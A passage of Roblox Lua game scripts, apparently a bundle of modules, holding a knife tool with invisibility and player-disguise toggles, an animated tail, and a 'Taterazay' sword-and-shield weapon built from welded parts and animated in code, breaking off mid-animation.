				animate.ArmRight(CFrame.Angles(math.rad(90)*i, 0, math.rad(45)*i))
					obj.HandleBackW.C1=CFrame.new(0, -1.5, 0)*CFrame.Angles(-math.rad(90+(90*i)), 0, 0)
				end
				for i=1, 0, -.2 do wait() 
					animate.Torso(CFrame.Angles(0, math.rad(45)*i, 0))
					animate.ArmRight(CFrame.Angles(math.rad(90)*i, 0, math.rad(45)*i))
					obj.HandleBackW.C1=CFrame.new(0, -1.5, 0)*CFrame.Angles(-math.rad(90+(90*i)), 0, 0)
				end
			end
		end
		if onStab==true then
			for i=0, 1, .2 do wait()
				animate.ArmRight(CFrame.Angles(math.rad(135-(45*i)), 0, 0))
				obj.HandleBackW.C1=CFrame.new(0, -1.5, 0)*CFrame.Angles(math.rad(90), 0, 0)
			end
			onStab=false
		end
		using=false
		--trailDeb=false
		combo=0
		body.Torso.Transparency=1 torso.Transparency=0
		running()
		findStab()
	end
end

bin.Selected:connect(function(mouse) createParts()
	human.WalkSpeed=speed
	running()
	using=true
	Equip:play()
	for i=1, 0, -.1 do wait()
		obj.HandleBackW.C1=CFrame.new(0, -1.5, 0)*CFrame.Angles(-math.rad(90), math.rad(180)*i, 0)
		obj.EdgeTopRW.C1=CFrame.new(0, .5, 0)*CFrame.Angles(math.rad(90)+math.rad(180)*i, 0, math.rad(90))
		obj.EdgeTopR2W.C1=CFrame.new(0, -.4, -.1)*CFrame.Angles(math.rad(90)+math.rad(180)*i, 0, math.rad(90))
	end
	using=false
	mouse.Button1Down:connect(attack)
	mouse.KeyDown:connect(function(key) 
		local key=key:lower()
		--INVISBLE--
		if key=="q" and keyDeb==false and switch==false and using==false then keyDeb=true switch=true using=true
			attackLabel.Text="Visible(Q)" print("1") Abscond:play()
			pcall(function() char.Sound.Disabled=true end)
			for i, v in pairs(char:children()) do
				c(function()
					for i=0, 1, .2 do wait()
						pcall(function()
							c(function() if v.Head~=nil then head.Transparency=1 end end)
							v.Transparency=i
							if v.Name == "HumanoidRootPart" then v.Transparency = 1 end
						end)
						pcall(function() v.Handle.Transparency=i end)
						pcall(function() v.face.Transparency=i end)
						pcall(function() v.roblox.Transparency=i end)
						pcall(function() v.Head.Transparency=i end)
						pcall(function() v.HumanoidRootPart.Transparency=i+1 end)
					end
				end)
			end
			for i, v in pairs(modelB:children()) do
				c(function()
					for i=0, 1, .2 do wait()
						pcall(function()
							v.Transparency=i
						end)
						pcall(function() v.Handle.Transparency=i end)
						pcall(function() v.face.Transparency=i end)
					end
				end)
			end
			wait(.5)
			local fakeModel=Instance.new("Model", workspace.CurrentCamera) fakeModel.Name="YOU"
			local fakeHumanoid=Instance.new("Humanoid", fakeModel) fakeHumanoid.Health=0 fakeHumanoid.MaxHealth=0
			local fakeHead=add.Part(fakeModel, false, false, "Bright green", 0, Vector3.new(1, 1, 1), nil) fakeHead.Name="Head"
			local fakeHeadM=add.Mesh("SpecialMesh", fakeHead, Vector3.new(1, 1.5, 1), nil, "File")
			fakeHeadM.MeshId="http://www.roblox.com/Asset/?id=9756362"
			local fakeHeadW=add.Weld(fakeHead, torso, CFrame.new(0, 1.5, 0))
			modelB.Parent=workspace.CurrentCamera
			for i, v in pairs(modelB:children()) do
				c(function()
					for i=0, 1, .2 do wait()
						pcall(function()
							v.Transparency=.5
						end)
						pcall(function() v.Handle.Transparency=.5 end)
						pcall(function() v.face.Transparency=.5 end)
					end
				end)
			end
			keyDeb=false
		elseif key=="q" and keyDeb==false and switch==true and using==true then keyDeb=true switch=false using=false
			attackLabel.Text="Invisible(Q)" print("2") Abscond:play()
			pcall(function() char.Sound.Disabled=false end)
			modelB.Parent=char
			for i, v in pairs(char:children()) do
				c(function()
					for i=1, 0, -.2 do wait()
						pcall(function()
							c(function() if v.Head~=nil then head.Transparency=1 end end)
							v.Transparency=i
							if v.Name == "HumanoidRootPart" then v.Transparency = 1 end
						end)
						pcall(function() v.Handle.Transparency=i end)
						pcall(function() v.face.Transparency=i end)
						pcall(function() v.roblox.Transparency=i end)
						pcall(function() v.Head.Transparency=i end)
						pcall(function() v.HumanoidRootPart.Transparency=i+1 end)
					end
				end)
			end
			for i, v in pairs(modelB:children()) do
				c(function()
					for i=1, 0, -.2 do wait()
						pcall(function()
							v.Transparency=i
						end)
						pcall(function() v.Handle.Transparency=i end)
						pcall(function() v.face.Transparency=i end)
					end
				end)
			end
			for i, v in pairs(workspace.CurrentCamera:children()) do pcall(function() v:remove() end) end
			wait(.5)
			keyDeb=false
			findStab()
		end
		--DISGUISE MENU--
		local xSpace=0
		if key=="e" and keyDeb2==false and switch2==false then keyDeb2=true switch2=true
			attackLabel2.Text="Menu:"
			for i, v in pairs(game.Players:children()) do
				if v~=player then xSpace=xSpace+1
					local playersLabel=add.Gui("TextButton", attackLabel2, "Really black", "Really black", "Bright red", "Size18", v.Name, 0, UDim2.new(1, 0, 1, 0), UDim2.new(xSpace, 0, 0, 0))
					playersLabel.MouseButton1Click:connect(function() Abscond:play()
						pcall(function()
							for i, v in pairs(char:children()) do
								pcall(function() v.face:remove() end)
								pcall(function() v.roblox:remove() end)
								pcall(function() v.Head:remove() end)
								if v:IsA("BodyColors") then v:remove() end
								if v:IsA("Hat") then v:remove() end
								if v:IsA("ShirtGraphic") then v:remove() end
								if v:IsA("Pants") then v:remove() end
								if v:IsA("Shirt") then v:remove() end
								if v:IsA("CharacterMesh") then v:remove() end
								if v:IsA("BodyColors") then v:remove() end
							end
							for i, v in pairs(game.Players[playersLabel.Text].Character:children()) do
								pcall(function() local cloned=v.face:clone() cloned.Parent=head if switch==true then pcall(function() cloned.Transparency=1 end) end end)
								pcall(function() v.roblox:clone().Parent=torso end)
								if v:IsA("BodyColors") then v:clone().Parent=char end
								if v:IsA("Hat") then local cloned=v:clone() cloned.Parent=char if switch==true then pcall(function() cloned.Handle.Transparency=1 end) end end
								if v:IsA("ShirtGraphic") then v:clone().Parent=char end
								if v:IsA("Pants") then v:clone().Parent=char end
								if v:IsA("Shirt") then v:clone().Parent=char end
								if v:IsA("CharacterMesh") then v:clone().Parent=char end
								if v:IsA("BodyColors") then v:clone().Parent=char end
							end
							head.Transparency=1
							local fakeModel=Instance.new("Model", char) fakeModel.Name=playersLabel.Text
							local fakeHumanoid=Instance.new("Humanoid", fakeModel) fakeHumanoid.Health=100 fakeHumanoid.MaxHealth=100
							local fakeHead=add.Part(fakeModel, false, false, game.Players[playersLabel.Text].Character.Head.Color, 0, Vector3.new(1, 1, 1), nil) fakeHead.Name="Head"
							if switch==true then fakeHead.Transparency=1 end
							local fakeHeadM=add.Mesh("SpecialMesh", fakeHead, Vector3.new(1.25, 1.25, 1.25), nil, "Head")
							local fakeHeadW=add.Weld(fakeHead, torso, CFrame.new(0, 1.5, 0))
						end)
					end)
				end
			end
			keyDeb2=false
		elseif key=="e" and keyDeb2==false and switch2==true then keyDeb2=true switch2=false
			attackLabel2.Text="Disguise(E)"
			for i, v in pairs(attackLabel2:children()) do
				pcall(function()v:remove()end)
			end
			keyDeb2=false
		end
	end)
	findStab()
end)
bin.Deselected:connect(function()
	Equip:play()
	for i=0, 1, .1 do wait()
		obj.HandleBackW.C1=CFrame.new(0, -1.5, 0)*CFrame.Angles(-math.rad(90), math.rad(180)*i, 0)
		obj.EdgeTopRW.C1=CFrame.new(0, .5, 0)*CFrame.Angles(math.rad(90)+math.rad(180)*i, 0, math.rad(90))
		obj.EdgeTopR2W.C1=CFrame.new(0, -.4, -.1)*CFrame.Angles(math.rad(90)+math.rad(180)*i, 0, math.rad(90))
	end
switch2=false using=false for i, v in pairs(attackLabel2:children()) do pcall(function()v:remove()end) end removeParts() end)--mediafire

end}
module[7] = {"Tail",function()
User = game.Players.LocalPlayer.Character

-------------------------------
--Part Making and Positioning--
-------------------------------
TailParts = {User.Torso}
Welds = {}
for i = 2, 13 do
TailParts[i] = Instance.new("Part", User)
TailParts[i].Name = "TailPart"
TailParts[i].CanCollide = false
TailParts[i].Locked = true
TailParts[i].formFactor = "Symmetric"
TailParts[i].Size = Vector3.new(1, 1, 1)
TailMesh = Instance.new("BlockMesh", TailParts[i])
TailMesh.Name = "TailMesh"
TailMesh.Scale = Vector3.new(0.3 - (i - 1) / 80, 0.3 - (i - 1) / 80, 0.25)
Welds[i - 1] = Instance.new("Weld", TailParts[i])
Welds[i - 1].Part0 = TailParts[i - 1]
Welds[i - 1].Part1 = TailParts[i]
Welds[i - 1].C0 = CFrame.new(0, 0, 0.125)
Welds[i - 1].C1 = CFrame.new(0, 0, -0.125)
if i ~= 13 then
TailDecoration = Instance.new("Part", User)
TailDecoration.Name = "TailPart"
TailDecoration.CanCollide = false
TailDecoration.Locked = true
TailDecoration.formFactor = "Symmetric"
TailDecoration.Size = Vector3.new(1, 1, 1)
TailDecoration.BrickColor = User:FindFirstChild("Head").BrickColor
TailMesh = Instance.new("BlockMesh", TailDecoration)
TailMesh.Name = "TailMesh"
TailMesh.Scale = Vector3.new(0.305 - (i - 1) / 80, 0.1, 0.255)
Weld = Instance.new("Weld", TailDecoration)
Weld.Part0 = TailParts[i]
Weld.Part1 = TailDecoration
Weld.C0 = CFrame.new(0, -0.1, 0)
Weld.C1 = CFrame.new(0, 0, 0)
for e = 1, math.random(0, 1) do
TailStrype = Instance.new("Part", User)
TailStrype.Name = "TailPart"
TailStrype.CanCollide = false
TailStrype.Locked = true
TailStrype.formFactor = "Symmetric"
TailStrype.Size = Vector3.new(1, 1, 1)
TailStrype.BrickColor = User:FindFirstChild("Head").BrickColor
TailMesh = Instance.new("BlockMesh", TailStrype)
TailMesh.Name = "TailMesh"
TailMesh.Scale = Vector3.new(0.33 - (i - 1) / 80, 0.33 - (i - 1) / 80, 0.05)
Weld = Instance.new("Weld", TailStrype)
Weld.Part0 = TailParts[i]
Weld.Part1 = TailStrype
Weld.C0 = CFrame.new(0, 0, math.random(-10, 10) / 80)
Weld.C1 = CFrame.new(0, 0, 0)
end
end
end
Welds[1].C0 = CFrame.new(0, -1, 0.5)
--------------------
--Part Colloration--
--------------------
for i = 2, 12 do
TailParts[i].BrickColor = User:FindFirstChild("Torso").BrickColor
end
TailParts[13].BrickColor = User:FindFirstChild("Head").BrickColor
-----------------------
--Animation Smoothing--
-----------------------
function TailSmooth(WhereTo0, WhereTo1)
CR0 = CFrame.new(Welds[1].C1:toEulerAnglesXYZ()).p
CR1 = CFrame.new(WhereTo0).p
AddTo0 = (CR1 - CR0) / 20
CR2 = CFrame.new(Welds[7].C1:toEulerAnglesXYZ()).p
CR3 = CFrame.new(WhereTo1).p
AddTo1 = (CR3 - CR2) / 20
for a = 1, 10 do
wait(0.025)
for b = 1, 6 do
Welds[b].C1 = Welds[b].C1 * CFrame.fromEulerAnglesXYZ(AddTo0.x, AddTo0.y + User.Torso.RotVelocity.y / 128, AddTo0.z)
end
for c = 7, 12 do
Welds[c].C1 = Welds[c].C1 * CFrame.fromEulerAnglesXYZ(AddTo1.x, AddTo1.y + User.Torso.RotVelocity.y / 128, AddTo1.z)
end
end
end
---------------------
--Animation Players--
---------------------
Variation = math.random(-5, 5) / 80
while true do
wait()
Variation = (Variation + math.random(-5, 5) / 80) / 2
if User.Torso.Velocity.magnitude > 8 then
TailSmooth(Vector3.new(-math.pi / 12 + Variation, math.pi / 9, 0), Vector3.new(math.pi / 9 + math.random(-5, 5) / 20, -math.pi / 6, 0))
TailSmooth(Vector3.new(-math.pi / 12 + Variation, math.pi / 6, 0), Vector3.new(math.pi / 9 + math.random(-5, 5) / 20, -math.pi / 12, 0))
TailSmooth(Vector3.new(-math.pi / 12 + Variation, math.pi / 9, 0), Vector3.new(math.pi / 9 + math.random(-5, 5) / 20, math.pi / 12, 0))
TailSmooth(Vector3.new(-math.pi / 12 + Variation, -math.pi / 9, 0), Vector3.new(math.pi / 9 + math.random(-5, 5) / 20, math.pi / 6, 0))
TailSmooth(Vector3.new(-math.pi / 12 + Variation, -math.pi / 6, 0), Vector3.new(math.pi / 9 + math.random(-5, 5) / 20, math.pi / 12, 0))
TailSmooth(Vector3.new(-math.pi / 12 + Variation, -math.pi / 9, 0), Vector3.new(math.pi / 9 + math.random(-5, 5) / 20, -math.pi / 12, 0))
else
TailSmooth(Vector3.new(-math.pi / 24 + Variation, math.pi / 18, 0), Vector3.new(math.pi / 9 + math.random(-5, 5) / 20, -math.pi / 12, 0))
TailSmooth(Vector3.new(-math.pi / 24 + Variation, math.pi / 12, 0), Vector3.new(math.pi / 9 + math.random(-5, 5) / 20, -math.pi / 24, 0))
TailSmooth(Vector3.new(-math.pi / 24 + Variation, math.pi / 18, 0), Vector3.new(math.pi / 9 + math.random(-5, 5) / 20, math.pi / 24, 0))
TailSmooth(Vector3.new(-math.pi / 24 + Variation, -math.pi / 18, 0), Vector3.new(math.pi / 9 + math.random(-5, 5) / 20, math.pi / 12, 0))
TailSmooth(Vector3.new(-math.pi / 24 + Variation, -math.pi / 12, 0), Vector3.new(math.pi / 9 + math.random(-5, 5) / 20, math.pi / 24, 0))
TailSmooth(Vector3.new(-math.pi / 24 + Variation, -math.pi / 18, 0), Vector3.new(math.pi / 9 + math.random(-5, 5) / 20, -math.pi / 24, 0))
end
end

end}

 
 

module[1] = {"Taterazay",function()
--[[                                              
Script shared by eletronix                                              ]]

Player = game:GetService("Players").LocalPlayer
local unlocks = Instance.new("StringValue")
unlocks.Name = "Unlocks"
unlocks.Parent = Player 
unlocks.Value = "Rage Slash Combo"
Character = Player.Character 
PlayerGui = Player.PlayerGui 
Backpack = Player.Backpack 
Torso = Character.Torso 
Head = Character.Head 
LeftArm = Character["Left Arm"] 
LeftLeg = Character["Left Leg"] 
RightArm = Character["Right Arm"] 
RightLeg = Character["Right Leg"] 
LS = Torso["Left Shoulder"] 
LH = Torso["Left Hip"] 
RS = Torso["Right Shoulder"] 
RH = Torso["Right Hip"] 
ModelName = "Weapon"
attack = false
attacktype = 1
Hitdeb = 0
Neck = Torso.Neck
local neckcf0 = Neck.C0
----------------------------
--Customize
Rage = 0
MaxRage = 200
mindamage = 200
maxdamage = 200
crtmaxdamage = 200
omindamage = mindamage
omaxdamage = maxdamage
ocrtmaxdamage = crtmaxdamage
if (string.match(Player.Unlocks.Value,"Taterazay Crit Plus") ~= nil) then
crtrate = 100/10
else
crtrate = 100/10
end
--100%/critpercentage
blockpower = 3
oblkbrkr = 1
blockbreaker = oblkbrkr
handlecolor = BrickColor.new("Dark stone grey")
bcolor = BrickColor.new("Mid grey")
gemcolor = BrickColor.new("Bright red")
ToolName = "Taterazay"
---------------------------------------------------------------------------------------------------------------------------------------
if Character:findFirstChild("EquippedVal",true) ~= nil then
Character:findFirstChild("EquippedVal",true).Parent = nil
end
ev = Instance.new("BoolValue",Character)
ev.Name = "EquippedVal"
ev.Value = false
if Character:findFirstChild("Block",true) ~= nil then
Character:findFirstChild("Block",true).Parent = nil
end
blk = Instance.new("BoolValue",Character)
blk.Name = "Block"
blk.Value = false
blkc = Instance.new("IntValue",blk)
blkc.Name = "BlockPower"
blkc.Value = blockpower
--player
player = nil
--welds
RW, LW , RWL, LWL = Instance.new("Weld"), Instance.new("Weld"), Instance.new("Weld"), Instance.new("Weld")
--what anim
anim = "none"
--other var
player = Player
ch = Character
--save shoulders
AoETrue = {}
RSH, LSH , RHL, LHL = ch.Torso["Right Shoulder"], ch.Torso["Left Shoulder"] , ch.Torso["Right Hip"] , ch.Torso["Left Hip"]
function RWFunc()
        RW.Part1 = ch["Right Arm"]
        RSH.Part1 = nil
end
function LWFunc()
        LW.Part1 = ch["Left Arm"]
        LSH.Part1 = nil
end
function RWLFunc()
        RWL.Part1 = ch["Right Leg"]
        RHL.Part1 = nil
        ch["Right Leg"].Name = "RightLeg"
        RightLeg.CanCollide = false
end
function LWLFunc()
        LWL.Part1 = ch["Left Leg"]
        LHL.Part1 = nil
        ch["Left Leg"].Name = "LeftLeg"
        LeftLeg.CanCollide = true
end
function RWLRem()
        RightLeg.Name = "Right Leg"
        RWL.Part1 = nil
        RHL.Part1 = ch["Right Leg"]
        RightLeg.CanCollide = false
end
function LWLRem()
        LeftLeg.Name = "Left Leg"
        LWL.Part1 = nil
        LHL.Part1 = ch["Left Leg"]
        LeftLeg.CanCollide = false
end
function RWRem()
        RW.Part1 = nil
        RSH.Part1 = ch["Right Arm"]
end
function LWRem()
        LW.Part1 = nil
        LSH.Part1 = ch["Left Arm"]
end
if Character:findFirstChild(ModelName,true) ~= nil then
Character:findFirstChild(ModelName,true).Parent = nil
        RHL.Part1 = ch["Right Leg"]
        LHL.Part1 = ch["Left Leg"]
        RSH.Part1 = ch["Right Arm"]
        LSH.Part1 = ch["Left Arm"]
end
local swordholder = Instance.new("Model")
swordholder.Name = ModelName
swordholder.Parent = Character
--derp
        RW.Part0 = ch.Torso
        RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0, 0, 0)
        RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0, 0, 0)
        RW.Parent = swordholder
        --
        LW.Part0 = ch.Torso
        LW.C0 = CFrame.new(-1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.7, 0, 0.8)
        LW.C1 = CFrame.new(0, 0.5, 0)
        LW.Parent = swordholder
        --
        RWL.Part0 = ch.Torso
        RWL.C0 = CFrame.new(1, -1, 0) * CFrame.Angles(0, 0, 0)
        RWL.C1 = CFrame.new(0.5, 1, 0)
        RWL.Parent = swordholder
        --
        LWL.Part0 = ch.Torso
        LWL.C0 = CFrame.new(-1, -1, 0) * CFrame.Angles(0, 0, 0)
        LWL.C1 = CFrame.new(-0.5, 1, 0)
        LWL.Parent = swordholder
local msh1 = Instance.new("BlockMesh")
msh1.Scale = Vector3.new(1,1,1)
local msh2 = Instance.new("BlockMesh")
msh2.Scale = Vector3.new(1,1,1)
local msh3 = Instance.new("BlockMesh")
msh3.Scale = Vector3.new(1.01,1.01,1.01)
local msh4 = Instance.new("BlockMesh")
msh4.Scale = Vector3.new(1,0.75,1)
msh4.Offset = Vector3.new(0,0.5,0)
local msh6 = Instance.new("SpecialMesh")
msh6.MeshType = "Sphere"
local prt1 = Instance.new("Part")
prt1.formFactor = 3
prt1.CanCollide = false
prt1.Name = "Handle"
prt1.Locked = true
prt1.Size = Vector3.new(0.3,1.5,0.3)
prt1.Parent = swordholder
msh1.Parent = prt1
prt1.BrickColor = handlecolor
local prt2 = Instance.new("Part")
prt2.formFactor = 3
prt2.CanCollide = false
prt2.Name = "Handle2"
prt2.Locked = true
prt2.Size = Vector3.new(0.8,0.2,0.8)
prt2.Parent = swordholder
msh2.Parent = prt2
prt2.BrickColor = handlecolor
local prt3 = Instance.new("Part")
prt3.formFactor = 3
prt3.CanCollide = false
prt3.Name = "HandlePart"
prt3.Locked = true
prt3.Size = Vector3.new(0.3,1,0.3)
prt3.Parent = swordholder
msh3.Parent = prt3
prt3.BrickColor = gemcolor
local prt4 = Instance.new("Part")
prt4.formFactor = 3
prt4.CanCollide = false
prt4.Name = "Blade"
prt4.Locked = true
prt4.Size = Vector3.new(0.5,4,0.2)
prt4.Parent = swordholder
msh4.Parent = prt4
prt4.Reflectance = 0.25
prt4.BrickColor = bcolor
local prt5 = Instance.new("WedgePart")
prt5.formFactor = 3
prt5.CanCollide = false
prt5.Name = "BladeTip"
prt5.Locked = true
prt5.Size = Vector3.new(0.2,1,0.5)
prt5.Parent = swordholder
prt5.Reflectance = 0.25
prt5.BrickColor = bcolor
local prt6 = Instance.new("Part")
prt6.formFactor = 3
prt6.CanCollide = false
prt6.Name = "HandlePart2"
prt6.Locked = true
prt6.Size = Vector3.new(0.5,0.5,0.5)
prt6.Parent = swordholder
prt6.BrickColor = handlecolor
msh6.Parent = prt6
local msh7 = Instance.new("BlockMesh")
local msh8 = Instance.new("BlockMesh")
msh8.Scale = Vector3.new(1.1,0.9,1.1)
local msh9 = Instance.new("CylinderMesh")
msh9.Scale = Vector3.new(1,1,1)
local msh10 = Instance.new("CylinderMesh")
msh10.Scale = Vector3.new(1,1,1)
local msh11 = Instance.new("CylinderMesh")
msh11.Scale = Vector3.new(1,1,1)
---Shield
local prt7 = Instance.new("Part")
prt7.formFactor = 3
prt7.CanCollide = false
prt7.Name = "Shield"
prt7.Locked = true
prt7.Size = Vector3.new(3.5,0.2,2)
prt7.Parent = swordholder
msh7.Parent = prt7
prt7.BrickColor = bcolor
prt7.Reflectance = 0.25
local prt8 = Instance.new("Part")
prt8.formFactor = 3
prt8.CanCollide = false
prt8.Name = "ShieldOutline"
prt8.Locked = true
prt8.Size = prt7.Size
prt8.Parent = swordholder
msh8.Parent = prt8
prt8.BrickColor = handlecolor
local prt9 = Instance.new("Part")
prt9.formFactor = 3
prt9.CanCollide = false
prt9.Name = "ShieldDesign"
prt9.Locked = true
prt9.Size = Vector3.new(0.5,0.2,0.5)
prt9.Parent = swordholder
msh9.Parent = prt9
prt9.BrickColor = gemcolor
local prt10 = Instance.new("Part")
prt10.formFactor = 3
prt10.CanCollide = false
prt10.Name = "ShieldDesign"
prt10.Locked = true
prt10.Size = Vector3.new(0.5,0.2,0.5)
prt10.Parent = swordholder
msh10.Parent = prt10
prt10.BrickColor = gemcolor
local prt11 = Instance.new("Part")
prt11.formFactor = 3
prt11.CanCollide = false
prt11.Name = "ShieldDesign"
prt11.Locked = true
prt11.Size = Vector3.new(0.5,0.2,0.5)
prt11.Parent = swordholder
msh11.Parent = prt11
prt11.BrickColor = gemcolor
local w1 = Instance.new("Weld")
w1.Parent = prt1
w1.Part0 = prt1
local w2 = Instance.new("Weld")
w2.Parent = prt2
w2.Part0 = prt2
w2.Part1 = prt1
w2.C1 = CFrame.new(0, 0,0) * CFrame.Angles(0, 0, 0)
w2.C0 = CFrame.new(0, 0.75,0) * CFrame.Angles(0, 0, 0)
local w3 = Instance.new("Weld")
w3.Parent = prt3
w3.Part0 = prt3
w3.Part1 = prt1
w3.C1 = CFrame.new(0, 0,0) * CFrame.Angles(0, 0, 0)
w3.C0 = CFrame.new(0, 0,0) * CFrame.Angles(0, 0, 0)
local w4 = Instance.new("Weld")
w4.Parent = prt4
w4.Part0 = prt4
w4.Part1 = prt1
w4.C1 = CFrame.new(0, 0,0) * CFrame.Angles(0, 0, 0)
w4.C0 = CFrame.new(0, 0.75+prt4.Size.y/2,0) * CFrame.Angles(0, 0, 0)
local w5 = Instance.new("Weld")
w5.Parent = prt5
w5.Part0 = prt5
w5.Part1 = prt1
w5.C1 = CFrame.new(0, 0,0) * CFrame.Angles(0, 0, 0)
w5.C0 = CFrame.Angles(math.rad(180), math.rad(-90), 0) * CFrame.new(0, 1.25+prt4.Size.y*0.75,0)
local w6 = Instance.new("Weld")
w6.Parent = prt6
w6.Part0 = prt6
w6.Part1 = prt1
w6.C1 = CFrame.new(0, 0,0) * CFrame.Angles(0, 0, 0)
w6.C0 = CFrame.new(0, -0.85,0) * CFrame.Angles(0, 0, 0)
--Shield weld
local w7 = Instance.new("Weld")
w7.Parent = prt7
w7.Part0 = prt7
w7.Part1 = LeftArm
w7.C1 = CFrame.new(0, 0,0) * CFrame.Angles(0, 0, 0)
w7.C0 = CFrame.new(0, 0.5,0) * CFrame.Angles(math.rad(90), math.rad(90), 0)
local w8 = Instance.new("Weld")
w8.Parent = prt8
w8.Part0 = prt8
w8.Part1 = prt7
w8.C1 = CFrame.new(0, 0,0) * CFrame.Angles(0, 0, 0)
w8.C0 = CFrame.new(0, 0,0) * CFrame.Angles(0, 0, 0)
local w9 = Instance.new("Weld")
w9.Parent = prt9
w9.Part0 = prt9
w9.Part1 = prt7
w9.C1 = CFrame.new(0, 0,0) * CFrame.Angles(0, 0, 0)
w9.C0 = CFrame.new(0.5, 0.005,0.5) * CFrame.Angles(0, 0, 0)
local w10 = Instance.new("Weld")
w10.Parent = prt10
w10.Part0 = prt10
w10.Part1 = prt7
w10.C1 = CFrame.new(0, 0,0) * CFrame.Angles(0, 0, 0)
w10.C0 = CFrame.new(0.5, 0.005,-0.5) * CFrame.Angles(0, 0, 0)
local w11 = Instance.new("Weld")
w11.Parent = prt11
w11.Part0 = prt11
w11.Part1 = prt7
w11.C1 = CFrame.new(0, 0,0) * CFrame.Angles(0, 0, 0)
w11.C0 = CFrame.new(-0.5, 0.005,0) * CFrame.Angles(0, 0, 0)
local RAP = Instance.new("Part")
RAP.formFactor = 0
RAP.CanCollide = false
RAP.Name = "RAPart"
RAP.Locked = true
RAP.Size = Vector3.new(1,1,1)
RAP.Parent = swordholder
RAP.Transparency = 1
local w = Instance.new("Weld")
w.Parent = RAP
w.Part0 = RAP
w.Part1 = RightArm
w.C1 = CFrame.fromEulerAnglesXYZ(0, 0, 0) * CFrame.new(0, 0,0)
w.C0 = CFrame.fromEulerAnglesXYZ(math.rad(0), 0, 0) * CFrame.new(0, 1, 0)
function unequipweld()
w1.Part1 = Torso 
w1.C1 = CFrame.fromEulerAnglesXYZ(0, math.rad(0), math.rad(0)) * CFrame.new(0, 0,0)
w1.C0 = CFrame.fromEulerAnglesXYZ(math.rad(0),math.rad(180), math.rad(35)) * CFrame.new(-1, -1.5, -0.6)
end
unequipweld()
function equipweld()
w1.Part1 = RAP
w1.C1 = CFrame.fromEulerAnglesXYZ(0, 0, 0) * CFrame.new(0, 0,0)
w1.C0 = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(90)) * CFrame.new(0, 0, 0)
end
function ss(parent,p) --Slash
local SlashSound = Instance.new("Sound")
SlashSound.SoundId = "rbxasset://sounds\\swordslash.wav"
SlashSound.Parent = parent
SlashSound.Volume = .7
SlashSound.Pitch = p
SlashSound.PlayOnRemove = true
coroutine.resume(coroutine.create(function()
wait() 
SlashSound.Parent = nil
end))
end
function uss(parent,p) --unsheath
local SlashSound = Instance.new("Sound")
SlashSound.SoundId = "rbxasset://sounds\\unsheath.wav"
SlashSound.Parent = parent
SlashSound.Volume = .7
SlashSound.Pitch = p
SlashSound.PlayOnRemove = true
coroutine.resume(coroutine.create(function()
wait() 
SlashSound.Parent = nil
end))
end
function cs(parent,p) --Magic Charge
local SlashSound = Instance.new("Sound")
SlashSound.SoundId = "http://www.roblox.com/asset/?id=2101137"
SlashSound.Parent = parent
SlashSound.Volume = .7
SlashSound.Pitch = p
SlashSound.PlayOnRemove = true
coroutine.resume(coroutine.create(function()
wait() 
SlashSound.Parent = nil
end))
end
function ls(parent,p) --Lazer Sound
local SlashSound = Instance.new("Sound")
SlashSound.SoundId = "http://www.roblox.com/asset?id=1369158"
SlashSound.Parent = parent
SlashSound.Volume = .7
SlashSound.Pitch = p
SlashSound.PlayOnRemove = true
coroutine.resume(coroutine.create(function()
wait()
SlashSound.Parent = nil
end))
end
function ts(parent,p)
local SlashSound = Instance.new("Sound")
SlashSound.SoundId = "http://www.roblox.com/asset/?id=12222030"
SlashSound.Parent = parent
SlashSound.Volume = .7
SlashSound.Pitch = p
SlashSound.PlayOnRemove = true
coroutine.resume(coroutine.create(function()
wait()
SlashSound.Parent = nil
end))
end
function fs(parent,p) --Fire Sound
local SlashSound = Instance.new("Sound")
SlashSound.SoundId = "http://www.roblox.com/asset/?id=31758982"
SlashSound.Parent = parent
SlashSound.Volume = .7
SlashSound.Pitch = p
SlashSound.PlayOnRemove = true
coroutine.resume(coroutine.create(function()
wait()
SlashSound.Parent = nil
end))
end
function ms(parent,p) --Metal Cling Sound
local SlashSound = Instance.new("Sound")
SlashSound.SoundId = "rbxasset://sounds\\metal.ogg"
SlashSound.Parent = parent
SlashSound.Volume = 1
SlashSound.Pitch = p
SlashSound.PlayOnRemove = true
coroutine.resume(coroutine.create(function()
wait()
SlashSound.Parent = nil
end))
end
function bs(parent,p) --Berserk Sound
local SlashSound = Instance.new("Sound")
SlashSound.SoundId = "http://www.roblox.com/asset/?id=2676305"
SlashSound.Parent = parent
SlashSound.Volume = 1
SlashSound.Pitch = p
SlashSound.PlayOnRemove = true
coroutine.resume(coroutine.create(function()
wait()
SlashSound.Parent = nil
end))
end
--
function returndmg()
mindamage = omindamage
maxdamage = omaxdamage
crtmaxdamage = ocrtmaxdamage
end
function subdmg(sub)
mindamage = omindamage - sub
maxdamage = omaxdamage - sub
crtmaxdamage = ocrtmaxdamage - sub
end
function prcntdmg(sub)
mindamage = math.floor(omindamage - (omindamage*(sub/100)))
maxdamage = math.floor(omaxdamage - (omaxdamage*(sub/100)))
crtmaxdamage = math.floor(ocrtmaxdamage - (ocrtmaxdamage*(sub/100)))
end
function tagHumanoid(humanoid, player)
        local creator_tag = Instance.new("ObjectValue")
        creator_tag.Value = player
        creator_tag.Name = "creator"
        creator_tag.Parent = humanoid
end
function untagHumanoid(humanoid)
        if humanoid ~= nil then
                local tag = humanoid:findFirstChild("creator")
                if tag ~= nil then
                        tag.Parent = nil
                end
        end
end
local function rayCast(Pos, Dir, Max, Ignore)  -- Origin Position , Direction, MaxDistance , IgnoreDescendants
return game.Workspace:FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), Ignore) 
end 
function hideanim()
attack = true
for i = 0 , 1 ,0.1 do
wait()
RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(45+155*i),math.rad(45+15*i),0)
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(45-45*i),math.rad(-45+45*i),0)
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
w1.C0 = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(90)) * CFrame.new(0, 0, 0)
end
LWRem()        
unequipweld()
for i = 0 , 1 ,0.1 do
wait()
RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(200-200*i),math.rad(60-60*i),0)
